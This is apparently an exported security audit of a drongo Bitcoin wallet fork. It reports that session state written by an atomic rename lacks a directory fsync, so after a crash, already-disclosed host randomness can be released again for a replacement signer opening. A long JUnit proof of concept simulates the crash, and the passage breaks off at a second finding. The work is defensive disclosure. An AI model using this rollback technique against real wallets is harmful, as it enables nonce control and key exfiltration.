> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 5s
```

---

# Rename is not durable before randomness disclosure
**#247986**
- Severity: Medium
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
#### Lines 50-81 — _The temporary file is forced and moved, but the parent directory is never forced._

```
    static void write(Path path, byte[] body, boolean createOnly) throws IOException {
        if(createOnly && Files.exists(path)) throw new IOException("State already exists");
        byte[] encoded = ByteBuffer.allocate(body.length + 32).put(body).put(Sha256Hash.hash(body)).array();
        Path absolute = path.toAbsolutePath();
        Path parent = absolute.getParent();
        Path temporary = Files.createTempFile(parent, absolute.getFileName() + ".", ".tmp");
        boolean moved = false;
        try {
            try {
                Files.setPosixFilePermissions(temporary, EnumSet.of(OWNER_READ, OWNER_WRITE));
            } catch(UnsupportedOperationException ignored) {
                // Windows uses inherited ACLs; POSIX stores are restricted explicitly.
            }
            try(FileChannel channel = FileChannel.open(temporary, StandardOpenOption.WRITE,
                    StandardOpenOption.TRUNCATE_EXISTING)) {
                ByteBuffer buffer = ByteBuffer.wrap(encoded);
                while(buffer.hasRemaining()) channel.write(buffer);
                channel.force(true);
            }
            try {
                if(createOnly) {
                    Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE);
                } else {
                    Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
                }
            } catch(AtomicMoveNotSupportedException e) {
                throw new IOException("Filesystem does not support atomic durable-state replacement", e);
            }
            moved = true;
        } finally {
            if(!moved) Files.deleteIfExists(temporary);
        }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (2 locations)
#### Lines 120-149 — _Message 3 is returned immediately after the incomplete durability sequence._

```
    public byte[] acceptOpenings(byte[] encodedOpenings) {
        if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                return state.message3.clone();
            }
            AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
            AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
            if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
            AntiExfilCodec.validateTransition(commit, openings);
            List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
            for(AntiExfilSlot slot : openings.getSlots()) {
                AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                byte[] rho = state.rhos.get(identifier);
                if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                        slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
            }
            AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                    openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
            AntiExfilCodec.validateTransition(openings, reveal);
            byte[] message3 = AntiExfilCodec.encode(reveal);
            State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                    state.message1, encodedOpenings, message3, null, null, state.rhos);
            // This durable write is the security boundary: no rho is returned before it succeeds.
            AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
            return message3.clone();
        });
```
⋯
#### Lines 238-260 — _The previous commitments-created state remains a valid state that retains its rho map._

```
    private void validateState(State state) {
        if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
        List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
        AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
        AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                commit.getNetwork(), commit.getSessionId(), state.rhos);
        if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
        if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
        if(state.phase == Phase.COMMITMENTS_CREATED) {
            if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
            return;
        }
        if(state.message2 == null || state.message3 == null) invalidPhase();
        AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
        AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
        AntiExfilCodec.validateTransition(commit, openings);
        AntiExfilCodec.validateTransition(openings, reveal);
        for(AntiExfilSlot slot : reveal.getSlots()) {
            byte[] expected = state.rhos.get(identifier(slot));
            if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
        }
        if(state.phase == Phase.OPENINGS_ACCEPTED) {
            if(state.message4 != null || state.signedPsbt != null) invalidPhase();
```
## Description

`acceptOpenings` states that its durable write is the boundary before host randomness may be returned. The helper forces the temporary file and atomically renames it over the session, but it never forces the containing directory after that rename. `FileChannel.force(true)` on the temporary file persists its contents, while `ATOMIC_MOVE` guarantees atomic namespace visibility rather than crash persistence of the directory entry. A power loss after message 3 is returned can therefore recover the older, valid `COMMITMENTS_CREATED` file containing the same randomness map. That recovered phase accepts a different openings message and releases the already-known randomness again.
## Root cause

The implementation equates an atomic rename with a durably committed rename and omits the parent-directory fsync required before releasing the host secret.
## Impact

A malicious signer can choose a replacement opening after learning host randomness, restoring control over the final nonce and enabling a subliminal key-exfiltration channel. The failure occurs specifically across the durability boundary that the API claims protects this security property.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.channels.SeekableByteChannel;
import java.nio.file.AccessMode;
import java.nio.file.CopyOption;
import java.nio.file.DirectoryStream;
import java.nio.file.FileStore;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.PathMatcher;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.nio.file.WatchEvent;
import java.nio.file.WatchKey;
import java.nio.file.WatchService;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.FileAttribute;
import java.nio.file.attribute.FileAttributeView;
import java.nio.file.spi.FileSystemProvider;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void drivesFrozenPsbtTranscriptThroughDurableCoordinator() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] expectedCommit = Utils.hexToBytes(field(vector, "message_1_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore keystore = keystore();

        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));

        Path session = temporary.resolve("poc.aexs");
        Path journal = temporary.resolve("poc.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertArrayEquals(expectedCommit, coordinator.getHostCommitMessage());

        byte[] reveal = coordinator.acceptOpenings(openings);
        AntiExfilMessage revealMessage = AntiExfilCodec.decode(reveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessage.getStage());
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(expectedCommit), AntiExfilCodec.decode(openings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openings), revealMessage);

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertFalse(completion.isBroadcast());
        assertEquals(field(vector, "signed_psbt_sha256"), Utils.bytesToHex(Sha256Hash.hash(completion.getSignedPsbt())));
        assertEquals(5, completion.getVerifiedSignatures().size());
        assertEquals(5, AntiExfilPsbt.enumerateSigningSlots(original, keystore).size());
    }

    @Test
    void acceptOpeningsDisclosesSameHostRandomnessAgainAfterUnfsyncedRenameRollback() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        Keystore keystore = keystore();
        byte[] firstOpenings = openingsFromFinalSignatures(Utils.hexToBytes(field(vector, "message_4_hex")));

        CrashRecoveringFileSystem crashFs = new CrashRecoveringFileSystem();
        Path session = crashFs.wrap(temporary.resolve("rollback-session.aexs"));
        Path journal = crashFs.wrap(temporary.resolve("rollback-journal.aexj"));
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        crashFs.checkpointDurableState();

        byte[] firstRevealBytes = coordinator.acceptOpenings(firstOpenings);
        AntiExfilMessage firstReveal = AntiExfilCodec.decode(firstRevealBytes);
        assertEquals(AntiExfilStage.HOST_REVEAL, firstReveal.getStage());
        assertEquals(AntiExfilCoordinator.Phase.OPENINGS_ACCEPTED,
                AntiExfilCoordinator.load(session, journal, keystore).getStatus().getPhase());
        assertTrue(crashFs.hasUnfsyncedRename(session), "acceptOpenings returned after an atomic move that was not made directory-durable");

        crashFs.crashRecoverUnfsyncedRenames();
        AntiExfilCoordinator rolledBack = AntiExfilCoordinator.load(session, journal, keystore);
        assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED, rolledBack.getStatus().getPhase(),
                "the pre-acceptance state remains valid after the unfsynced rename is lost");
        assertThrows(AntiExfilException.class, rolledBack::getHostRevealMessage);

        byte[] secondOpenings = changeFirstSignerOpening(firstOpenings);
        assertNotEquals(Utils.bytesToHex(firstOpenings), Utils.bytesToHex(secondOpenings),
                "the signer gets to choose a different opening after learning rho");
        byte[] secondRevealBytes = rolledBack.acceptOpenings(secondOpenings);
        AntiExfilMessage secondReveal = AntiExfilCodec.decode(secondRevealBytes);
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(coordinator.getHostCommitMessage()), AntiExfilCodec.decode(secondOpenings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(secondOpenings), secondReveal);

        assertNotEquals(Utils.bytesToHex(firstRevealBytes), Utils.bytesToHex(secondRevealBytes),
                "the transcript changed because the accepted signer opening changed");
        assertEquals(firstReveal.getSlots().size(), secondReveal.getSlots().size());
        for(int i = 0; i < firstReveal.getSlots().size(); i++) {
            assertArrayEquals(firstReveal.getSlots().get(i).getHostRandomness(), secondReveal.getSlots().get(i).getHostRandomness(),
                    "the already-disclosed host randomness is released again for the replacement opening");
        }
    }

    private static byte[] openingsFromFinalSignatures(byte[] signatures) {
        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        return AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));
    }

    private static byte[] changeFirstSignerOpening(byte[] encodedOpenings) {
        AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
        List<AntiExfilSlot> changed = new ArrayList<>(openings.getSlots());
        AntiExfilSlot first = changed.getFirst();
        byte[] replacement = ECKey.fromPrivate(BigInteger.valueOf(2L)).getPubKey();
        if(Arrays.equals(replacement, first.getOpening())) {
            replacement = ECKey.fromPrivate(BigInteger.valueOf(3L)).getPubKey();
        }
        changed.set(0, new AntiExfilSlot(first.getInputIndex(), first.getSighashType(), first.getSignerPublicKey(),
                first.getMessageHash(), first.getCommitment(), replacement, null, null));
        return AntiExfilCodec.encode(new AntiExfilMessage(openings.getNetwork(), openings.getStage(),
                openings.getSessionId(), openings.getPsbtDigest(), changed));
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}

final class CrashRecoveringFileSystem {
    private final Path root = Paths.get("").toAbsolutePath();
    private final CrashProvider provider = new CrashProvider(this);
    private final CrashFileSystem fileSystem = new CrashFileSystem(provider);
    private final Map<Path, byte[]> pendingRenameBackups = new HashMap<>();

    Path wrap(Path path) {
        return new CrashPath(fileSystem, path.toAbsolutePath());
    }

    void recordMove(Path target, byte[] previousBytes) {
        pendingRenameBackups.put(target.toAbsolutePath(), previousBytes == null ? null : previousBytes.clone());
    }

    void markDirectoryDurable(Path directory) {
        Path durableDirectory = directory.toAbsolutePath();
        pendingRenameBackups.keySet().removeIf(path -> Objects.equals(path.getParent(), durableDirectory));
    }

    void checkpointDurableState() {
        pendingRenameBackups.clear();
    }

    boolean hasUnfsyncedRename(Path path) {
        return pendingRenameBackups.containsKey(CrashProvider.unwrap(path).toAbsolutePath());
    }

    void crashRecoverUnfsyncedRenames() throws IOException {
        for(Map.Entry<Path, byte[]> entry : new ArrayList<>(pendingRenameBackups.entrySet())) {
            if(entry.getValue() == null) {
                Files.deleteIfExists(entry.getKey());
            } else {
                Files.write(entry.getKey(), entry.getValue(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
            }
        }
        pendingRenameBackups.clear();
    }

    private Path root() {
        return root;
    }
}

final class CrashProvider extends FileSystemProvider {
    private final CrashRecoveringFileSystem crashFs;

    CrashProvider(CrashRecoveringFileSystem crashFs) {
        this.crashFs = crashFs;
    }

    static Path unwrap(Path path) {
        return path instanceof CrashPath crashPath ? crashPath.delegate() : path;
    }

    @Override
    public String getScheme() {
        return "crashfs";
    }

    @Override
    public FileSystem newFileSystem(URI uri, Map<String, ?> env) {
        throw new UnsupportedOperationException();
    }

    @Override
    public FileSystem getFileSystem(URI uri) {
        return crashFs.wrap(crashFs.root()).getFileSystem();
    }

    @Override
    public Path getPath(URI uri) {
        return crashFs.wrap(Paths.get(uri));
    }

    @Override
    public SeekableByteChannel newByteChannel(Path path, Set<? extends OpenOption> options, FileAttribute<?>... attrs) throws IOException {
        return newFileChannel(path, options, attrs);
    }

    @Override
    public FileChannel newFileChannel(Path path, Set<? extends OpenOption> options, FileAttribute<?>... attrs) throws IOException {
        Path real = unwrap(path).toAbsolutePath();
        if(Files.isDirectory(real)) {
            return new CrashDirectoryChannel(crashFs, real);
        }
        if(options.contains(StandardOpenOption.CREATE) || options.contains(StandardOpenOption.CREATE_NEW)) {
            Path parent = real.getParent();
            if(parent != null) Files.createDirectories(parent);
        }
        return new CrashFileChannel(FileChannel.open(real, options, attrs));
    }

    @Override
    public DirectoryStream<Path> newDirectoryStream(Path dir, DirectoryStream.Filter<? super Path> filter) throws IOException {
        DirectoryStream<Path> delegate = Files.newDirectoryStream(unwrap(dir), entry -> filter.accept(crashFs.wrap(entry)));
        return new DirectoryStream<>() {
            @Override
            public Iterator<Path> iterator() {
                Iterator<Path> iterator = delegate.iterator();
                return new Iterator<>() {
                    @Override public boolean hasNext() { return iterator.hasNext(); }
                    @Override public Path next() { return crashFs.wrap(iterator.next()); }
                };
            }
            @Override public void close() throws IOException { delegate.close(); }
        };
    }

    @Override
    public void createDirectory(Path dir, FileAttribute<?>... attrs) throws IOException {
        Files.createDirectory(unwrap(dir), attrs);
    }

    @Override
    public void delete(Path path) throws IOException {
        Files.delete(unwrap(path));
    }

    @Override
    public void copy(Path source, Path target, CopyOption... options) throws IOException {
        Files.copy(unwrap(source), unwrap(target), options);
    }

    @Override
    public void move(Path source, Path target, CopyOption... options) throws IOException {
        Path realSource = unwrap(source).toAbsolutePath();
        Path realTarget = unwrap(target).toAbsolutePath();
        byte[] previous = Files.exists(realTarget) ? Files.readAllBytes(realTarget) : null;
        Files.move(realSource, realTarget, options);
        crashFs.recordMove(realTarget, previous);
    }

    @Override
    public boolean isSameFile(Path path, Path path2) throws IOException {
        return Files.isSameFile(unwrap(path), unwrap(path2));
    }

    @Override
    public boolean isHidden(Path path) throws IOException {
        return Files.isHidden(unwrap(path));
    }

    @Override
    public FileStore getFileStore(Path path) throws IOException {
        return Files.getFileStore(unwrap(path));
    }

    @Override
    public void checkAccess(Path path, AccessMode... modes) throws IOException {
        Path real = unwrap(path);
        if(!Files.exists(real)) throw new java.nio.file.NoSuchFileException(real.toString());
        if(modes != null) {
            for(AccessMode mode : modes) {
                if(mode == AccessMode.READ && !Files.isReadable(real)) throw new IOException("not readable: " + real);
                if(mode == AccessMode.WRITE && !Files.isWritable(real)) throw new IOException("not writable: " + real);
                if(mode == AccessMode.EXECUTE && !Files.isExecutable(real)) throw new IOException("not executable: " + real);
            }
        }
    }

    @Override
    public <V extends FileAttributeView> V getFileAttributeView(Path path, Class<V> type, LinkOption... options) {
        return Files.getFileAttributeView(unwrap(path), type, options);
    }

    @Override
    public <A extends BasicFileAttributes> A readAttributes(Path path, Class<A> type, LinkOption... options) throws IOException {
        return Files.readAttributes(unwrap(path), type, options);
    }

    @Override
    public Map<String, Object> readAttributes(Path path, String attributes, LinkOption... options) throws IOException {
        return Files.readAttributes(unwrap(path), attributes, options);
    }

    @Override
    public void setAttribute(Path path, String attribute, Object value, LinkOption... options) throws IOException {
        Files.setAttribute(unwrap(path), attribute, value, options);
    }
}

final class CrashFileSystem extends FileSystem {
    private final CrashProvider provider;

    CrashFileSystem(CrashProvider provider) {
        this.provider = provider;
    }

    @Override public FileSystemProvider provider() { return provider; }
    @Override public void close() { }
    @Override public boolean isOpen() { return true; }
    @Override public boolean isReadOnly() { return false; }
    @Override public String getSeparator() { return FileSystems.getDefault().getSeparator(); }
    @Override public Iterable<Path> getRootDirectories() { return Collections.emptyList(); }
    @Override public Iterable<FileStore> getFileStores() { return Collections.emptyList(); }
    @Override public Set<String> supportedFileAttributeViews() { return FileSystems.getDefault().supportedFileAttributeViews(); }
    @Override public Path getPath(String first, String... more) { return new CrashPath(this, Paths.get(first, more)); }
    @Override public PathMatcher getPathMatcher(String syntaxAndPattern) { return FileSystems.getDefault().getPathMatcher(syntaxAndPattern); }
    @Override public java.nio.file.attribute.UserPrincipalLookupService getUserPrincipalLookupService() { return FileSystems.getDefault().getUserPrincipalLookupService(); }
    @Override public WatchService newWatchService() throws IOException { return FileSystems.getDefault().newWatchService(); }
}

final class CrashPath implements Path {
    private final CrashFileSystem fileSystem;
    private final Path delegate;

    CrashPath(CrashFileSystem fileSystem, Path delegate) {
        this.fileSystem = fileSystem;
        this.delegate = delegate;
    }

    Path delegate() { return delegate; }

    private Path wrap(Path path) { return path == null ? null : new CrashPath(fileSystem, path); }

    @Override public CrashFileSystem getFileSystem() { return fileSystem; }
    @Override public boolean isAbsolute() { return delegate.isAbsolute(); }
    @Override public Path getRoot() { return wrap(delegate.getRoot()); }
    @Override public Path getFileName() { return wrap(delegate.getFileName()); }
    @Override public Path getParent() { return wrap(delegate.getParent()); }
    @Override public int getNameCount() { return delegate.getNameCount(); }
    @Override public Path getName(int index) { return wrap(delegate.getName(index)); }
    @Override public Path subpath(int beginIndex, int endIndex) { return wrap(delegate.subpath(beginIndex, endIndex)); }
    @Override public boolean startsWith(Path other) { return delegate.startsWith(CrashProvider.unwrap(other)); }
    @Override public boolean startsWith(String other) { return delegate.startsWith(other); }
    @Override public boolean endsWith(Path other) { return delegate.endsWith(CrashProvider.unwrap(other)); }
    @Override public boolean endsWith(String other) { return delegate.endsWith(other); }
    @Override public Path normalize() { return wrap(delegate.normalize()); }
    @Override public Path resolve(Path other) { return wrap(delegate.resolve(CrashProvider.unwrap(other))); }
    @Override public Path resolve(String other) { return wrap(delegate.resolve(other)); }
    @Override public Path resolveSibling(Path other) { return wrap(delegate.resolveSibling(CrashProvider.unwrap(other))); }
    @Override public Path relativize(Path other) { return wrap(delegate.relativize(CrashProvider.unwrap(other))); }
    @Override public URI toUri() { return delegate.toUri(); }
    @Override public Path toAbsolutePath() { return wrap(delegate.toAbsolutePath()); }
    @Override public Path toRealPath(LinkOption... options) throws IOException { return wrap(delegate.toRealPath(options)); }
    @Override public File toFile() { return delegate.toFile(); }
    @Override public WatchKey register(WatchService watcher, WatchEvent.Kind<?>[] events, WatchEvent.Modifier... modifiers) throws IOException { return delegate.register(watcher, events, modifiers); }
    @Override public WatchKey register(WatchService watcher, WatchEvent.Kind<?>... events) throws IOException { return delegate.register(watcher, events); }
    @Override public Iterator<Path> iterator() {
        Iterator<Path> iterator = delegate.iterator();
        return new Iterator<>() {
            @Override public boolean hasNext() { return iterator.hasNext(); }
            @Override public Path next() { return wrap(iterator.next()); }
        };
    }
    @Override public int compareTo(Path other) { return delegate.compareTo(CrashProvider.unwrap(other)); }
    @Override public boolean equals(Object other) { return other instanceof Path path && delegate.equals(CrashProvider.unwrap(path)); }
    @Override public int hashCode() { return delegate.hashCode(); }
    @Override public String toString() { return delegate.toString(); }
}

class CrashFileChannel extends FileChannel {
    private final FileChannel delegate;

    CrashFileChannel(FileChannel delegate) {
        this.delegate = delegate;
    }

    @Override public int read(ByteBuffer dst) throws IOException { return delegate.read(dst); }
    @Override public long read(ByteBuffer[] dsts, int offset, int length) throws IOException { return delegate.read(dsts, offset, length); }
    @Override public int write(ByteBuffer src) throws IOException { return delegate.write(src); }
    @Override public long write(ByteBuffer[] srcs, int offset, int length) throws IOException { return delegate.write(srcs, offset, length); }
    @Override public long position() throws IOException { return delegate.position(); }
    @Override public FileChannel position(long newPosition) throws IOException { delegate.position(newPosition); return this; }
    @Override public long size() throws IOException { return delegate.size(); }
    @Override public FileChannel truncate(long size) throws IOException { delegate.truncate(size); return this; }
    @Override public void force(boolean metaData) throws IOException { delegate.force(metaData); }
    @Override public long transferTo(long position, long count, java.nio.channels.WritableByteChannel target) throws IOException { return delegate.transferTo(position, count, target); }
    @Override public long transferFrom(java.nio.channels.ReadableByteChannel src, long position, long count) throws IOException { return delegate.transferFrom(src, position, count); }
    @Override public int read(ByteBuffer dst, long position) throws IOException { return delegate.read(dst, position); }
    @Override public int write(ByteBuffer src, long position) throws IOException { return delegate.write(src, position); }
    @Override public MappedByteBuffer map(MapMode mode, long position, long size) throws IOException { return delegate.map(mode, position, size); }
    @Override public FileLock lock(long position, long size, boolean shared) throws IOException { return delegate.lock(position, size, shared); }
    @Override public FileLock tryLock(long position, long size, boolean shared) throws IOException { return delegate.tryLock(position, size, shared); }
    @Override protected void implCloseChannel() throws IOException { delegate.close(); }
}

final class CrashDirectoryChannel extends FileChannel {
    private final CrashRecoveringFileSystem crashFs;
    private final Path directory;
    private boolean open = true;

    CrashDirectoryChannel(CrashRecoveringFileSystem crashFs, Path directory) {
        this.crashFs = crashFs;
        this.directory = directory.toAbsolutePath();
    }

    @Override public void force(boolean metaData) {
        crashFs.markDirectoryDurable(directory);
    }

    private IOException directoryOnly() { return new IOException("directory channel only supports force() in this crash simulator"); }
    @Override public int read(ByteBuffer dst) throws IOException { throw directoryOnly(); }
    @Override public long read(ByteBuffer[] dsts, int offset, int length) throws IOException { throw directoryOnly(); }
    @Override public int write(ByteBuffer src) throws IOException { throw directoryOnly(); }
    @Override public long write(ByteBuffer[] srcs, int offset, int length) throws IOException { throw directoryOnly(); }
    @Override public long position() throws IOException { throw directoryOnly(); }
    @Override public FileChannel position(long newPosition) throws IOException { throw directoryOnly(); }
    @Override public long size() throws IOException { throw directoryOnly(); }
    @Override public FileChannel truncate(long size) throws IOException { throw directoryOnly(); }
    @Override public long transferTo(long position, long count, java.nio.channels.WritableByteChannel target) throws IOException { throw directoryOnly(); }
    @Override public long transferFrom(java.nio.channels.ReadableByteChannel src, long position, long count) throws IOException { throw directoryOnly(); }
    @Override public int read(ByteBuffer dst, long position) throws IOException { throw directoryOnly(); }
    @Override public int write(ByteBuffer src, long position) throws IOException { throw directoryOnly(); }
    @Override public MappedByteBuffer map(MapMode mode, long position, long size) throws IOException { throw directoryOnly(); }
    @Override public FileLock lock(long position, long size, boolean shared) throws IOException { throw directoryOnly(); }
    @Override public FileLock tryLock(long position, long size, boolean shared) throws IOException { throw directoryOnly(); }
    @Override protected void implCloseChannel() { open = false; }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 19 lines & 0.65234375 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 4s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC uses a test-only FileSystemProvider/Path wrapper to deterministically model the documented POSIX crash-persistence gap: file contents are force()'d, atomic rename is visible, but the parent directory entry is recoverable unless the implementation opens and force()'s the directory. It does not power-cycle the host kernel or prove behavior on every filesystem; it proves the library releases message 3 without issuing a parent-directory durability operation and that the real coordinator accepts a replacement openings message when the pre-acceptance state is recovered. Verified with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`; Gradle reported BUILD SUCCESSFUL with 5 executed tasks.
### Validation reasoning

PoC validation command completed successfully.

---

# Rollbackable state permits randomness reuse
**#247987**
- Severity: High
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (2 locations)
#### Lines 120-149 — _The retry guard depends entirely on the phase in the replaceable state file._

```
    public byte[] acceptOpenings(byte[] encodedOpenings) {
        if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                return state.message3.clone();
            }
            AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
